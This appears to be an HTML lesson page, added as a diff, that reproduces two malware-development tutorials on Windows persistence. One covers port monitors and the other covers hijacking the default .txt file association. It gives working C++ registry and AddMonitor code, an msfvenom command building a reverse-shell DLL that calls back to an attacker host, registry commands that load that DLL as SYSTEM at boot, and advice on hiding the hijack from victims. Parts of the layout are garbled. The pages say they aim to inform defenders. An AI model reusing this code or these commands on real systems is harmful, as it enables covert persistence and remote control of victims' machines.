@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 8. Port monitors.</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #34</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 8. Port monitors.</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is the result of self-researching one of the interesting malware persistence trick: Port monitors. port monitors Port Monitor refers to the Windows Print Spooler Service or spoolv.exe in this post. When adding a printer port monitor, a user (or an attacker) is able to add an arbitrary dll that serves as the “monitor”. There are essentially two ways to add a port monitor, also known as your malicious DLL: through the Registry for persistence or a custom Windows application (AddMonitor function) for immediate dll execution. adding monitor Using the Win32 API, specifically the AddMonitor function of the Print Spooler API: BOOL AddMonitor( LPTSTR pName,</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">DWORD Level,
+LPBYTE pMonitors
+);
+it is possible to add an arbitrary monitor DLL immediately while the system is running.
+Note that you will need local administrator privileges to add the monitor.
+For example, source code of our monitor:
+/*
+monitor.cpp
+
+windows persistence via port monitors
+register the monitor port
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/06/19/malware-pers-8.html
+*/
+#include "windows.h"
+#pragma comment(lib, "winspool")
+int main(int argc, char* argv[]) {
+MONITOR_INFO_2 mi;
+mi.pName = "Monitor";
+mi.pEnvironment = "Windows x64";
+// mi.pDLLName = "evil.dll";
+mi.pDLLName = "evil2.dll";
+AddMonitor(NULL, 2, (LPBYTE)&amp;mi);
+return 0;
+}
+Compile it:
+x86_64-w64-mingw32-g++ -O2 monitor.cpp -o monitor.exe \
+-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
+-fdata-sections -Wno-write-strings -fno-exceptions \
+-fmerge-all-constants -static-libstdc++ \
+-static-libgcc -fpermissive -lwinspool
+
+Also, create our “evil” DLL:</code></pre>
+            </div>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp \</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">LHOST=192.168.56.1 LPORT=4445 -f dll > evil2.dll</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, compiling the code will produce an executable (monitor.exe in my case) that will register the malicious DLL (evil2.dll) on the system.</p>
+
+            <div id="demo-for-add-monitor" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Demo for add “monitor”</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Copy files and run:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">copy Z:\2022-06-19-malware-pers-8\evil2.dll .\ copy Z:\2022-06-19-malware-pers-8\monitor.exe .\ .\monitor.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">registry persistence A list of sub-key port monitors can be found within the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Monitors node. Each key should have a REG_SZ entry containing a Drivers DLL. At system startup, each of these DLLs will be executed as SYSTEM. First of all, before malicious actions, check sub keys: reg query \ "HKLM\System\CurrentControlSet\Control\Print\Monitors" \ /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, add sub key Meow and Driver value: reg add \ "HKLM\System\CurrentControlSet\Control\Print\Monitors\Meow" /v "Driver" /d "evil2.dll" /t REG_SZ reg query \ "HKLM\System\CurrentControlSet\Control\Print\Monitors" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is completed correctly. Then restart victim’s machine:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And after a few minutes:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to check Network tab in Process Hacker 2:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">We can see that the evil2.dll is being accessed by the spoolsv.exe (PID: 4616), which eventually spawns a rundll32 with our payload, that initiates a connection back to the attacker:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For cleanup, after end of experiments, run: Remove-ItemProperty -Path \ "HKLM:\System\CurrentControlSet\Control\Print\Monitors\ Meow" -Name "Driver"</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">My “dirty PoC” for registry persistence:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.cpp
+windows persistence via port monitors
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2022/06/19/malware-pers-8.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// subkey
+const char* sk =
+"\\System\\CurrentControlSet\\Control\\Print\\Monitors\\Meow";
+// evil DLL
+const char* evilDll = "evil.dll";
+// startup
+LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE,
+(LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE,
+KEY_WRITE | KEY_QUERY_VALUE, NULL, &amp;hkey, NULL);
+if (res == ERROR_SUCCESS) {
+
+// create new registry key
+RegSetValueEx(hkey, (LPCSTR)"Driver", 0, REG_SZ,
+(unsigned char*)evilDll, strlen(evilDll));
+RegCloseKey(hkey);
+} else {
+printf("failed to create new registry subkey :(");
+return -1;
+}
+return 0;
+}
+During Defcon 22, Brady Bloxham demonstrated this persistence technique. This
+method requires Administrator privileges and the DLL must be saved to disk.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The question remains whether any APTs uses this technique in the wild. Windows Print Spooler Service Defcon-22: Brady Bloxham - Getting Windows to Play with itself MITRE ATT&CK - Port Monitors persistence technique source code on Github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">75. malware development: persistence - part 9. Default file extension hijacking. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This article is the result of my own research into one of the interesting malware persistence trick: hijacking default file extension. default file association For example, when a .txt file is double-clicked, notepad.exe is used to open it.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Windows knows that it must use notepad.exe to access .txt files because the .txt extension (and many others) are mapped to applications that can open such files in the registry: HKEY_CLASSES_ROOT. It is possible to hijacking a default file association to execute a malicious program.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to hijack .txt. In this case, the .txt extension handler is specified in the registry key listed below: HKEY_CLASSES_ROOT\txtfile\shell\open\command Run command: reg query "HKCR\txtfile\shell\open\command" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, create our “malicious” application:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+evil app for windows persistence via
+hijacking default file extension
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/08/26/malware-pers-9.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+LPSTR lpCmdLine, int nCmdShow) {
+MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, the logic is pretty simple as usually: just pop-up meow-meow messagebox. At the next step, hijack the .txt file extension by modifying the value data of \HKEY_CLASSES_ROOT\txtfile\shell\open\command by this script:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.cpp
+windows persistence via
+hijacking default file extension
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/08/26/malware-pers-9.html
+
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// command for replace
+// "%SystemRoot%\\system32\\NOTEPAD.EXE %1"
+// malicious app
+const char* cmd = "Z:\\2022-08-26-malware-pers-9\\hack.exe";
+// hijacking logic
+LONG res = RegOpenKeyEx(HKEY_CLASSES_ROOT, (LPCSTR)
+"\\txtfile\\shell\\open\\command", 0 , KEY_WRITE, &amp;hkey);
+if (res == ERROR_SUCCESS) {
+// update key
+RegSetValueEx(hkey, (LPCSTR)"", 0, REG_SZ, (unsigned char*)cmd,
+strlen(cmd));
+RegCloseKey(hkey);
+}
+return 0;
+}
+As you can see, in this source code we just replace %SystemRoot%\system32\NOTEPAD.EXE
+%1 with Z:\2022-08-26-malware-pers-9\hack.exe.
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile our malware: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The generated hack.exe needs to be dropped into the victim’s machine. Then, compile the program responsible for persistence: x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">-I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The generated pers.exe also needs to be dropped into the victim’s machine. Then just run: .\pers.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, try to open .txt file, for example double-click test.txt:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, the “malware” will be executed. Perfect! :) Then, cleanup:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">reg add "HKEY_CLASSES_ROOT\txtfile\shell\open\command" /ve /t REG_SZ /d "%SystemRoot%\system</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">It would be good practice to do this (in real malware) with little bit different logic so that the victim user will still be able to open the original .txt file, but he will additionally run the malicious activity. This persistence trick is used by SILENTTRINITY framework and Kimsuky cyber espionage group. This malware was used in a 2019 campaign against Croatian government agencies by unidentified cyber actors. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. MITRE ATT&CK: Change Default File Association SILENTTRINITY Kimsuky source code on Github</p></main></body></html>
